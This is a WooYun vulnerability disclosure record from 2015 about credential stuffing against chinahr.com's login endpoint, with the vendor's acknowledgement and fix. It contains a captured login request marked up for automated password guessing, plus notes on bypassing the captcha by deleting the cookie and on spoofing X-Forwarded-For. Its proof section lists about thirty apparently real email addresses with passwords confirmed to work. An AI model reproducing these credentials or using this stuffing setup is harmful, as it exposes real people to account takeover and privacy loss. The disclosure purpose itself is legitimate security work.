{"id": 32530, "wybug_id": "wooyun-2015-0110996", "wybug_title": "中华英才网某接口撞库泄露用户登录凭据之二(有批量账号证明)", "wybug_corp": "中华英才网", "wybug_author": "路人甲", "wybug_date": "2015-04-29 19:07", "wybug_open_date": "2015-06-11 20:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-11：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 撞库扫号攻击已经是Top 10 Security Risks for 2014之一.撞库以大量的用户数据为基础，利用用户相同的注册习惯（相同的用户名和密码），尝试登陆其它的网站。2011年，互联网泄密事件引爆了整个信息安全界，导致传统的用户+密码认证的方式已无法满足现有安全需求。泄露数据包括：天涯：31,758,468条，CSDN：6,428,559条，微博：4,442,915条，人人网：4,445,047条，猫扑：2,644,726条，178：9,072,819条，嘟嘟牛：13,891,418条，7K7K：18,282,404条，共1.2亿条。不管你的网站密码保护的多好，但是面对已经泄露的账号密码，撞库扫号防御还是一个相当重要的环节。 详细说明：      主站登录接口没有防御撞库。验证码可以通过删除cookie的方式绕过。对登录接口的调用没有进行限制。经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号。 测试的时候还随机了x-forward-for header。  登录接口抓包如下：\nPOST /modules/jsperson/login_ajax.php?noblock=1 HTTP/1.1Host: www.chinahr.comProxy-Connection: keep-aliveContent-Length: 92Accept: application/json, text/javascript, */*; q=0.01Origin: http://www.chinahr.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www.chinahr.com/modules/jsperson/login.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: RA-Ver: 2.10.0RA-Sid: 7B9DD012-20150303-080129-82895f-fb68a9AlexaToolbar-ALX_NS_PH: AlexaToolbar/alxg-3.3uname=§513072290@qq.com§&password=§z1989111011111§&http_referer=&action=login&typeid=&remember=1\n   漏洞证明：  经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号.\nsy_ming@163.com\t26560280djm_19821127@163.com\t19821127273132705@qq.com\t636389king317329683@qq.com\t19851117147324943@qq.com\tsofa2008529076672@qq.com\thang852079utempfwcw@126.com\tutempfiwcwpilipaca@126.com\t85798579312358502@qq.com\t192837465zwc722@126.com\t19870722124373603114@qq.com\t123456789775687052@qq.com\t440882198812668975@qq.com\tchuanqicnwutiantai@126.com\t32201937zongc1989@163.com\tdick19890725shengri19880515@126.com\tshengri19880515513072290@qq.com\tz19891110423217211@qq.com\t4781944227wmcatmao@126.com\twm100086310014456@qq.com\tq123o3o3o4o50hf0515@163.com\tcool1980329892965@qq.com\t329892965li79135790@163.com\t3141596246sun258107891@126.com\t13608685671zjj88@yeah.net\t12251225qqsnail520@126.com\t58791407dgnelf@163.com\tnishiwo20408634526@qq.com\t1318641124807540766@qq.com\tz19871127xingyanwen@sina.com\txingyanwen20\n\n\n\n\n   修复方案：  撞库防御参考资料:http://stayliv3.github.io/2015/04/15/%E6%92%9E%E5%BA%93%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88/   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-30 13:17 厂商回复： 感谢您的关注，我们会尽快修复，谢谢 最新状态： 2015-06-11：漏洞已修复，感谢帮助  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}